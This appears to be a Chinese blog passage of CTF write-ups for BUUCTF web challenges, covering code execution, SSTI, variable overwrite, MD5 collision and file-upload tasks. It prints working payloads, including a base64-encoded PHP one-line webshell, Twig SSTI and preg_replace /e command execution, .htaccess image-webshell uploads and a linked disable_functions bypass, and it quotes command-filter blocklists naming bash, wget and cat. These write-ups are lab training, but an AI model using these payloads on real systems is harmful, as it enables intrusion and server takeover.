<p>第一眼看到以为是反序列化，结果没看到unserialize<br>__construct()函数中，code的值是调用x()函数，而x()函数可以请求一个参数Ginkgo,得到的参数在经过base解码后作为Eval()函数的参数执行了，Eval显然可以利用命令执行，尝试传入一个一句话木马(eval($_POST[“pass”]);)试试，不过这里要先base64编码<br>payload:?Ginkgo=ZXZhbCgkX1BPU1RbInBhc3MiXSk7<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/GKCTF2020_CheckIN/checkin_0.jpg" alt=""><br>用蚁剑连接成功，flag文件打开啥也没有，readflag文件是一堆乱码<br>去看了大佬的wp,说是利用PHP7.3版本的一个漏洞bypass disable_functions，该漏洞利用PHP garbage collector程序中的堆溢出触发命令执行，可影响linux,php7.0-7.3<br>大佬的exp:<a href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php</a><br>下载后修改一下<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/GKCTF2020_CheckIN/checkin_1.jpg" alt=""><br>在蚁剑里可以发现只有tmp文件夹是有权限写入的，将exp放到tmp里面，上传exp后利用最开始的命令执行来包含exp(include(“/tmp/exploit.php”);)<br>Payload:?Ginkgo=aW5jbHVkZSgiL3RtcC9leHBsb2l0LnBocCIpOw==<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/GKCTF2020_CheckIN/checkin_2.jpg" alt=""></p>
<h3 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/easy_web/easyweb0.jpg" alt=""><br>查看源码，没啥东西，就只有一张图片的base64编码形式。URL中img参数的值很像是base64编码，试着解码,可以解码，解码后的内容还是base64，继续</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">TXpVek5UTTFNbVUzTURabE5qYz0</span><br><span class="line">MzUzNTM1MmU3MDZlNjc=</span><br><span class="line">3535352e706e67</span><br></pre></td></tr></table></figure>
<p>这串数字是16进制，尝试转换一下，转出来是555.png<br>不难想到，img这个参数是不是可以将指定文件的内容输出出来。尝试输出一下index.php，不过要把index.php先转换为16进制，再进行两次base64编码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">696E6465782E706870</span><br><span class="line">Njk2RTY0NjU3ODJFNzA2ODcw</span><br><span class="line">TmprMlJUWTBOalUzT0RKRk56QTJPRGN3</span><br></pre></td></tr></table></figure>
<p>Payload:?img=TmprMlJUWTBOalUzT0RKRk56QTJPRGN3&amp;cmd=<br>结果在原来图片的位置返回了index.php的base64编码，解码后如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">if</span> (!isset(<span class="variable">$_GET</span>[<span class="string">'img'</span>]) || !isset(<span class="variable">$_GET</span>[<span class="string">'cmd'</span>])) </span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span>);</span><br><span class="line"><span class="variable">$file</span> = hex2bin(base64_decode(base64_decode(<span class="variable">$_GET</span>[<span class="string">'img'</span>])));</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>, <span class="string">""</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/flag/i"</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'&lt;img src ="./ctf3.jpeg"&gt;'</span>;</span><br><span class="line">    die(<span class="string">"xixi～ no flag"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$txt</span> = base64_encode(file_get_contents(<span class="variable">$file</span>));</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span> . <span class="variable">$txt</span> . <span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="built_in">echo</span>(<span class="string">"forbid ~"</span>);</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((string)<span class="variable">$_POST</span>[<span class="string">'a'</span>] !== (string)<span class="variable">$_POST</span>[<span class="string">'b'</span>] &amp;&amp; md5(<span class="variable">$_POST</span>[<span class="string">'a'</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">'b'</span>])) &#123;</span><br><span class="line">        <span class="built_in">echo</span> `<span class="variable">$cmd</span>`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">echo</span> (<span class="string">"md5 is funny ~"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>可以看到有个flag,但是被过滤了,不过在代码下方发现了很重要的东西</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> `<span class="variable">$cmd</span>`;</span><br></pre></td></tr></table></figure>
<p>反引号啊，意味着命令执行啊，但是好多系统命令都被过滤了，而且还要绕过md5强类型比较<br>md5强类型比较去网上找了一个大佬的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure>
<p>对于打印文件列表，虽然ls命令被过滤了，但很容易绕过，可用l\s<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/easy_web/easyweb1.jpg" alt=""><br>并没有发现flag,尝试ls一下根目录<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/easy_web/easyweb2.jpg" alt=""><br>发现了flag,现在需要读取flag，cat命令也被过滤了，还是老办法，反斜线绕过<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/easy_web/easyweb3.jpg" alt=""><br>这道题ls也可以用dir命令来代替</p>
<h3 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Unicornshop/Unicornshop1.jpg" alt=""><br>尝试买第一个<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Unicornshop/Unicornshop0.jpg" alt=""><br>说错误的商品，第二个和第三个也是这样，只有买第四个的时候不是这样<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Unicornshop/Unicornshop2.jpg" alt=""><br>只允许一个字符，额1337四个字符呢，那就需要是一个字符，而且还比1337大的数字，这就涉及Unicode的安全性了<br><a href="https://xz.aliyun.com/t/5402#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/5402#toc-0</a><br>可以在<a href="https://www.compart.com/en/unicode/mirrored这个网站找到我们需要的" target="_blank" rel="noopener">https://www.compart.com/en/unicode/mirrored这个网站找到我们需要的</a><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Unicornshop/Unicornshop3.jpg" alt=""><br>这个挺好看，就用这个了,而且5000也够了<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Unicornshop/Unicornshop4.jpg" alt=""><br>价格处输入：%E2%86%81<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Unicornshop/Unicornshop5.jpg" alt=""></p>
<h3 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h3><p>源码没啥重要的信息，扫了一下目录，发现.git,看来有git源码泄露，GitHack把源码扒下来</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include<span class="string">'flag.php'</span>;</span><br><span class="line"><span class="variable">$yds</span> = <span class="string">"dog"</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">"cat"</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">'yds'</span>; //看到这就能想到变量覆盖了</span><br><span class="line">foreach(<span class="variable">$_POST</span> as <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    $<span class="variable">$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line">foreach(<span class="variable">$_GET</span> as <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123; //漏洞点</span><br><span class="line">    $<span class="variable">$x</span> = $<span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line">foreach(<span class="variable">$_GET</span> as <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123; </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">'flag'</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">'flag'</span>)&#123; //get参数的键不能是flag,值还必须是flag</span><br><span class="line">        <span class="built_in">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!isset(<span class="variable">$_GET</span>[<span class="string">'flag'</span>]) &amp;&amp; !isset(<span class="variable">$_POST</span>[<span class="string">'flag'</span>]))&#123; //只要get 或者 post的参数flag就行</span><br><span class="line">    <span class="built_in">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">'flag'</span>] === <span class="string">'flag'</span>  || <span class="variable">$_GET</span>[<span class="string">'flag'</span>] === <span class="string">'flag'</span>)&#123; //不论是get 还是 post都不能出现flag=flag</span><br><span class="line">    <span class="built_in">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"the flag is: "</span>.<span class="variable">$flag</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>根据上面的分析，可构造如下Payload:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST: <span class="variable">$flag</span>=flag</span><br><span class="line">GET:  yds=flag</span><br></pre></td></tr></table></figure>
<p>分析如下：<br>想办法输出$flag<br>第一个foreach语句：$$flag=$flag,即$$flag=flag<br>第二个foreach语句：$yds=$flag,这很重要，为下面利用做准备<br>第三个foreach语句中的if语句：没有get一个flag,所以这层过滤直接失效<br>第一个if语句：if条件为假，输出$yds，而此时的$yds=$flag，刚好就是我们要的<br>最后在源码中得到flag</p>
<h3 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Themysteryofip/ip0.jpg" alt=""><br>能够获取我们的ip<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Themysteryofip/ip1.jpg" alt=""><br>提示说你知道为什么我知道你的ip吗，第一反应哪里会有命令执行，bp抓个包<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Themysteryofip/ip2.jpg" alt=""><br>看来不是命令执行，然后扫了一下目录，有个.DS_Store,里面也没啥东西<br>看大佬wp说是有SSTI,啊这。。。，我tcl,之前还专门去看过SSTI,题做得还是太少，总结的太少了，唉<br>先测试一下是不是有SSTI<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Themysteryofip/ip3.jpg" alt=""><br>还真有，那就先列一下目录<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Themysteryofip/ip4.jpg" alt=""><br>发现flag,cat一下<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Themysteryofip/ip5.jpg" alt=""></p>
<h3 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h3><p>给了源码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">"text"</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">"file"</span>];</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">'r'</span>)===<span class="string">"I have a dream"</span>))&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        die(<span class="string">"Not now!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    include(<span class="variable">$file</span>);  //next.php</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>get传入text和file，text的内容为I have a dream,file中不能有flag<br>text可用data协议绕过，然后用伪协议读取next.php<br>Payload:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?text=data://text/plain,I have a dream&amp;file=php://filter/convert.base64-encode/resource=next.php</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/ZJCTFbgrc/ZGCTFbgrc0.jpg" alt=""></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">'id'</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">'id'</span>] = <span class="variable">$id</span>;</span><br><span class="line"><span class="keyword">function</span> complex(<span class="variable">$re</span>, <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="built_in">return</span> preg_replace(</span><br><span class="line">        <span class="string">'/('</span> . <span class="variable">$re</span> . <span class="string">')/ei'</span>,</span><br><span class="line">        <span class="string">'strtolower("\\1")'</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line">foreach(<span class="variable">$_GET</span> as <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="built_in">echo</span> complex(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">getFlag</span></span>()&#123;</span><br><span class="line">	@<span class="built_in">eval</span>(<span class="variable">$_GET</span>[<span class="string">'cmd'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>preg_replace()函数/e模式下有命令执行漏洞，这篇文章讲的很详细：<a href="https://xz.aliyun.com/t/2557" target="_blank" rel="noopener">https://xz.aliyun.com/t/2557</a><br>想办法让它调用getFlag()函数，从而在参数cmd中构造命令执行<br>Payload:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?\S*=<span class="variable">$&#123;getFlag()&#125;</span>&amp;cmd=system(<span class="string">"ls /"</span>);</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/ZJCTFbgrc/ZGCTFbgrc1.jpg" alt=""><br>cat一下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?\S*=<span class="variable">$&#123;getFlag()&#125;</span>&amp;cmd=system(<span class="string">"cat /flag"</span>);</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/ZJCTFbgrc/ZGCTFbgrc2.jpg" alt=""></p>
<h3 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h3><p>和之前[BJDCTF2020]The mystery of ip这道题很像<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Cookieissostable/Cookieissostable0.jpg" alt=""><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Cookieissostable/Cookieissostable1.jpg" alt=""><br>看来这道题关键点在Cookie,bp抓一下包<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Cookieissostable/Cookieissostable3.jpg" alt=""><br>set-Cookie中有个user=admin,很有可能就是注入点，在Cookie中设置一下user，再发包<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Cookieissostable/Cookieissostable2.jpg" alt=""><br>测试一下是不是SSTI：49，返回49，则是Twig模板<br>存在SSTI,且是Twig模板<br>Payload:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">"exec"</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">"cat /flag"</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Cookieissostable/Cookieissostable4.jpg" alt=""></p>
<h3 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">I put something <span class="keyword">in</span> F12 <span class="keyword">for</span> you</span><br><span class="line">include <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="variable">$flag</span>=<span class="string">'MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'gg'</span>])&amp;&amp;isset(<span class="variable">$_GET</span>[<span class="string">'id'</span>])) &#123;</span><br><span class="line">    <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">'id'</span>];</span><br><span class="line">    <span class="variable">$gg</span>=<span class="variable">$_GET</span>[<span class="string">'gg'</span>];</span><br><span class="line">    <span class="keyword">if</span> (md5(<span class="variable">$id</span>) === md5(<span class="variable">$gg</span>) &amp;&amp; <span class="variable">$id</span> !== <span class="variable">$gg</span>) &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'You got the first step'</span>;</span><br><span class="line">        <span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">'passwd'</span>])) &#123;</span><br><span class="line">            <span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">'passwd'</span>];</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric(<span class="variable">$passwd</span>))&#123;</span><br><span class="line">                 <span class="keyword">if</span>(<span class="variable">$passwd</span>==1234567)&#123;</span><br><span class="line">                     <span class="built_in">echo</span> <span class="string">'Good Job!'</span>;</span><br><span class="line">                     highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line">                     die(<span class="string">'By Retr_0'</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span>&#123;</span><br><span class="line">                     <span class="built_in">echo</span> <span class="string">"can you think twice??"</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">echo</span> <span class="string">'You can not get it !'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">'only one way to get the flag'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"You are not a real hacker!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    die(<span class="string">'Please input first'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;You got the first steponly one way to get the flag</span><br></pre></td></tr></table></figure>
<p>第一步：md5强类型比较绕过，前几天刚遇到过,直接拿过来用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;gg=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure>
<p>第二步：弱类型比较</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">passwd=1234567zx</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Ez_bypass/easy_bypass.jpg" alt=""></p>
<h3 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h3><p>先上传phtml文件<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/BabyUpload/BabyUpload0.jpg" alt=""><br>把ph过滤了，那没法用php相关后缀的马了<br>尝试上传.htaccess<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/BabyUpload/BabyUpload1.jpg" alt=""><br>然后上传个图片马<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/BabyUpload/BabyUpload2.jpg" alt=""><br>啊这，根据以往经验，应该是过滤了&lt;?，改用js调用php的图片马<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/BabyUpload/BabyUpload3.jpg" alt=""><br>蚁剑直接连，在根目录发现flag,最初是想直接在终端cat出来，但是命令行被ban了<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/BabyUpload/BabyUpload4.jpg" alt=""></p>
<h3 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h3><p>普通马被过滤,看一下服务器，是Apache<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/YouSendYouMa/yousend0.jpg" alt=""><br>上传.htaccess<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/YouSendYouMa/yousend1.jpg" alt=""><br>然后上传图片马<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/YouSendYouMa/yousend2.jpg" alt=""><br>蚁剑直接连，根目录发现flag</p>
<h3 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/phpweb/phpweb0.jpg" alt=""><br>对date()函数报了一些警告，用burp抓一下包<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/phpweb/phpweb1.jpg" alt=""><br>可以看出参数func就是调用的函数名<br>date():<a href="https://www.w3school.com.cn/php/func_date_date.asp" target="_blank" rel="noopener">https://www.w3school.com.cn/php/func_date_date.asp</a><br>了解一下date()函数后，可以看出参数p应该就是被调用函数的参数<br>那么可以尝试读取一下index.php</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">func=file_get_contents&amp;p=index.php</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/phpweb/phpweb2.jpg" alt=""></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    <span class="variable">$disable_fun</span> = array(<span class="string">"exec"</span>,<span class="string">"shell_exec"</span>,<span class="string">"system"</span>,<span class="string">"passthru"</span>,<span class="string">"proc_open"</span>,<span class="string">"show_source"</span>,<span class="string">"phpinfo"</span>,<span class="string">"popen"</span>,<span class="string">"dl"</span>,<span class="string">"eval"</span>,<span class="string">"proc_terminate"</span>,<span class="string">"touch"</span>,<span class="string">"escapeshellcmd"</span>,<span class="string">"escapeshellarg"</span>,<span class="string">"assert"</span>,<span class="string">"substr_replace"</span>,<span class="string">"call_user_func_array"</span>,<span class="string">"call_user_func"</span>,<span class="string">"array_filter"</span>, <span class="string">"array_walk"</span>,  <span class="string">"array_map"</span>,<span class="string">"registregister_shutdown_function"</span>,<span class="string">"register_tick_function"</span>,<span class="string">"filter_var"</span>, <span class="string">"filter_var_array"</span>, <span class="string">"uasort"</span>, <span class="string">"uksort"</span>, <span class="string">"array_reduce"</span>,<span class="string">"array_walk"</span>, <span class="string">"array_walk_recursive"</span>,<span class="string">"pcntl_exec"</span>,<span class="string">"fopen"</span>,<span class="string">"fwrite"</span>,<span class="string">"file_put_contents"</span>);</span><br><span class="line">    <span class="keyword">function</span> gettime(<span class="variable">$func</span>, <span class="variable">$p</span>) &#123;</span><br><span class="line">        <span class="variable">$result</span> = call_user_func(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        <span class="variable">$a</span>= gettype(<span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">"string"</span>) &#123;</span><br><span class="line">            <span class="built_in">return</span> <span class="variable">$result</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="built_in">return</span> <span class="string">""</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class Test &#123;</span><br><span class="line">        var <span class="variable">$p</span> = <span class="string">"Y-m-d h:i:s a"</span>;</span><br><span class="line">        var <span class="variable">$func</span> = <span class="string">"date"</span>;</span><br><span class="line">        <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>() &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$this</span>-&gt;func != <span class="string">""</span>) &#123;</span><br><span class="line">                <span class="built_in">echo</span> gettime(<span class="variable">$this</span>-&gt;func, <span class="variable">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">"func"</span>];</span><br><span class="line">    <span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">"p"</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$func</span> != null) &#123;</span><br><span class="line">        <span class="variable">$func</span> = strtolower(<span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>,<span class="variable">$disable_fun</span>)) &#123;</span><br><span class="line">            <span class="built_in">echo</span> gettime(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            die(<span class="string">"Hacker..."</span>);</span><br><span class="line">        